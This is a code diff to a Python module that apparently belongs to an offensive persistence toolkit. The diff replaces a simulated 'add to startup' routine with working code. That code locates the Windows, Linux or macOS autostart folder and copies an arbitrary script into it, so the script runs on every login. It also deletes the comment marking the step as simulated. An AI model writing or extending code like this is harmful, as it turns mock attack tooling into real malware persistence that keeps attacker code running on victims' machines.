@@ -9,6 +9,7 @@ import random
 import os
 import tempfile
 import platform
+import shutil
 from typing import List, Dict, Any
 from datetime import datetime
 
@@ -317,23 +318,45 @@ def generate_persistence_report() -> Dict[str, Any]:
     )
 
 
+def _get_startup_folder():
+    """Gets the startup folder for the current operating system."""
+    system = platform.system()
+    if system == "Windows":
+        return os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
+    elif system == "Linux":
+        return os.path.join(os.getenv("HOME"), ".config", "autostart")
+    elif system == "Darwin":
+        return os.path.join(os.getenv("HOME"), "Library", "LaunchAgents")
+    else:
+        return None
+
+
 def add_startup_script(script_path: str) -> Dict[str, Any]:
-    """Add a script to startup for persistence."""
+    """Adds a script to the startup folder for persistence."""
     print(f"[+] Adding startup script: {script_path}")
     
+    startup_folder = _get_startup_folder()
+    if not startup_folder or not os.path.exists(startup_folder):
+        print(f"[-] Startup folder not found for this OS.")
+        return {}
+
+    try:
+        shutil.copy(script_path, startup_folder)
+        print(f"[+] Script copied to startup folder: {startup_folder}")
+        status = "Added to startup"
+    except Exception as e:
+        print(f"[-] Error copying script to startup folder: {e}")
+        status = "Failed to add to startup"
+
     manager = PersistenceManager()
-    
-    # Simulate adding to startup
     startup_config = {
         "script_path": script_path,
         "persistence_type": "Startup Script",
         "platform": manager.system_info["platform"],
         "detection_difficulty": "Low",
-        "status": "Added to startup",
+        "status": status,
         "activation": "System boot or user login"
     }
-    
-    print(f"[+] Startup script added successfully")
     
     return enrich_with_exploit_intel(
         "persistence",
